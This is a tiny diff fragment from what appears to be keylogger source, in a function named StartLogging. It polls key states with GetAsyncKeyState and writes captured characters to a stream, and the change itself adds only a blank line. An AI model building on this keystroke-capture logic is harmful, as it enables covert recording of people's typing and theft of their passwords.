@@ -88,6 +88,7 @@ void StartLogging()
                                 write<<"4";
                         }
                         break;
+                            
                         case 53:
                         {
                             if(GetAsyncKeyState(0x10))
